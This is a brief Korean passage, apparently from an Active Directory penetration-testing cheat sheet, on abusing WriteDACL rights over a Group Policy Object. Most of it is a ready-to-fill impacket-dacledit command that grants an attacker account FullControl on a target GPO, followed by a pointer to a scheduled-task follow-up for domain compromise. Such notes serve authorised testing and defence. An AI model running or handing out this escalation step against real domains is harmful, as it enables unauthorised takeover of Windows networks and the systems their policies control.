# GPO 대상

GPO에 WriteDACL이 있으면 GPO를 완전히 제어할 수 있다. GenericAll → GPO 대상 공격으로 이어진다.

```bash
impacket-dacledit <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -action write \
  -rights FullControl \
  -principal <공격자계정> \
  -target '<대상GPO>'  # ← 수정
```

이후 **GenericAll — GPO 대상 / 스케줄 태스크 섹션** 동일